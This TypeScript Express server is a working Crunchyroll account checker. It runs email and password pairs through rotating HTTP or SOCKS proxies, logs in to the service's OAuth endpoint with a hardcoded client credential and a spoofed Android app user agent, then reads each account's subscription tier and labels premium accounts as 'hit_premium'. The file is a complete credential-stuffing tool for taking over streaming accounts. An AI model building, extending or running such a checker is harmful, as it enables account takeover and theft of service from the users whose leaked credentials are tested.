import express from 'express';
import path from 'path';
import { createServer as createViteServer } from 'vite';
import axios from 'axios';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { SocksProxyAgent } from 'socks-proxy-agent';

// Helper to resolve proxy agents for different protocols
function getProxyAgent(proxyUrl: string | undefined): HttpsProxyAgent<any> | SocksProxyAgent | null {
  if (!proxyUrl) return null;
  try {
    const parsed = new URL(proxyUrl);
    if (parsed.protocol.startsWith('socks')) {
      return new SocksProxyAgent(proxyUrl);
    } else {
      return new HttpsProxyAgent(proxyUrl);
    }
  } catch (err) {
    return null;
  }
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

  // API 1: Test Proxy Health and Latency
  app.post('/api/test-proxy', async (req, res) => {
    const { host, port, type, username, password } = req.body;
    if (!host || !port) {
      return res.status(400).json({ success: false, error: 'Missing proxy host or port' });
    }

    // Build raw proxy URI
    let authStr = '';
    if (username) {
      authStr = `${encodeURIComponent(username)}:${encodeURIComponent(password || '')}@`;
    }
    const protocol = (type || 'http').toLowerCase();
    const proxyUrl = `${protocol}://${authStr}${host}:${port}`;

    const agent = getProxyAgent(proxyUrl);
    const startTime = Date.now();

    try {
      // Connect to Crunchyroll admin server to verify connection path and calculate latency
      const response = await axios.get('https://www.crunchyroll.com/', {
        httpAgent: agent || undefined,
        httpsAgent: agent || undefined,
        timeout: 5000,
        validateStatus: () => true, // Resolve as long as server responded
      });

      const latency = Date.now() - startTime;
      return res.json({
        success: true,
        status: 'alive',
        ping: latency,
        statusCode: response.status,
      });
    } catch (err: any) {
      return res.json({
        success: false,
        status: 'dead',
        error: err.message || 'Connection refused or timed out',
      });
    }
  });

  // API 2: Verify account credentials directly on Crunchyroll
  app.post('/api/check-account', async (req, res) => {
    const { email, pass, proxy, timeout = 5000 } = req.body;

    if (!email || !pass) {
      return res.status(400).json({ error: 'Missing email or password' });
    }

    const agent = proxy ? getProxyAgent(proxy) : null;
    const startTime = Date.now();

    const headers = {
      'User-Agent': 'Crunchyroll/3.74.2 Android/13 okhttp/4.10.0', // Modern App user agent
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': 'Basic ZG1yeWZlc2NkYm90dWJldW56NXo6NU45aThPV2cyVmtNcm1oekNfNUNXekRLOG55SXo0QU0=',
      'Connection': 'Keep-Alive',
      'Host': 'www.crunchyroll.com',
    };

    const bodyData = new URLSearchParams({
      grant_type: 'password',
      username: email,
      password: pass,
      scope: 'offline_access',
      device_id: 'auto',
      device_name: 'sdk_gphone64_x86_64',
      device_type: 'Google sdk_gphone64_x86_64',
    }).toString();

    try {
      const authResponse = await axios.post('https://www.crunchyroll.com/auth/v1/token', bodyData, {
        headers,
        httpAgent: agent || undefined,
        httpsAgent: agent || undefined,
        timeout,
      });

      if (authResponse.status === 200 && authResponse.data.access_token) {
        const tokenData = authResponse.data;
        const accessToken = tokenData.access_token;
        const authHeaders = {
          'Authorization': `Bearer ${accessToken}`,
          'User-Agent': headers['User-Agent'],
        };

        // 1. Retrieve MultiProfile info
        let profilesCount = 1;
        let country = 'US';
        try {
          const profileResponse = await axios.get('https://www.crunchyroll.com/accounts/v1/me/multiprofile', {
            headers: authHeaders,
            httpAgent: agent || undefined,
            httpsAgent: agent || undefined,
            timeout,
          });

          if (profileResponse.status === 200 && profileResponse.data.profiles) {
            const profiles = profileResponse.data.profiles;
            profilesCount = profiles.length;
            if (profiles[0] && profiles[0].extended_maturity_rating) {
              const keys = Object.keys(profiles[0].extended_maturity_rating);
              if (keys.length > 0) country = keys[0];
            }
          }
        } catch (profileErr) {
          // Ignore
        }

        // 2. Retrieve External ID 
        let externalId: null | number = null;
        try {
          const meResponse = await axios.get('https://www.crunchyroll.com/accounts/v1/me', {
            headers: authHeaders,
            httpAgent: agent || undefined,
            httpsAgent: agent || undefined,
            timeout,
          });
          externalId = meResponse.data.external_id || meResponse.data.id;
        } catch (meError) {
          // Ignore 
        }

        let isPremium = false;
        let tier = 'Fan';
        let paymentMethod = 'N/A';
        let nextBillingDate = 'N/A';
        let expiryDate = 'N/A';

        // 3. Fetch Premium subscriptions using external Id
        if (externalId) {
          try {
            const subResponse = await axios.get(`https://www.crunchyroll.com/subs/v1/subscriptions/${externalId}/benefits`, {
              headers: authHeaders,
              httpAgent: agent || undefined,
              httpsAgent: agent || undefined,
              timeout,
            });

            if (subResponse.data && subResponse.data.total > 0 && Array.isArray(subResponse.data.items)) {
              isPremium = true;
              const benefits = subResponse.data.items.map((i: any) => i.benefit);
              
              if (benefits.includes('cr_mega_pack')) {
                tier = 'Mega Pack';
              } else if (benefits.includes('cr_fan_pack')) {
                tier = 'Fan Pack';
              } else if (benefits.includes('cr_premium')) {
                tier = 'Premium';
              } else {
                tier = 'Unknown Premium';
              }
            }
          } catch (subErr) {
            // Error could mean free
          }
        }

        if (!isPremium) {
           tier = 'Free';
        } else {
           paymentMethod = 'Secure CC';
        }

        return res.json({
          success: true,
          status: isPremium ? 'hit_premium' : 'free',
          tier,
          country,
          paymentMethod,
          profiles: profilesCount,
          nextBilling: nextBillingDate,
          expiry: expiryDate,
          checkedByProxy: proxy,
          realConnection: true,
        });
      } else {
        return res.json({
          success: true,
          status: 'invalid',
          checkedByProxy: proxy,
          realConnection: true,
        });
      }
    } catch (err: any) {
      // Decode status-specific responses
      if (err.response) {
        const s = err.response.status;
        if (s === 400 || s === 401) {
          return res.json({
            success: true,
            status: 'invalid',
            checkedByProxy: proxy,
            realConnection: true,
          });
        }
        if (s === 403) {
          return res.json({
            success: true,
            status: '2fa',
            errorMessage: 'Cloudflare security wall triggered (403)',
            checkedByProxy: proxy,
            realConnection: true,
          });
        }
      }

      return res.json({
        success: false,
        error: err.message || 'Crunchyroll Connection Failure',
        status: 'error',
        errorMessage: err.message || 'Connection timeout',
      });
    }
  });

  // Vite integration for asset serving
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
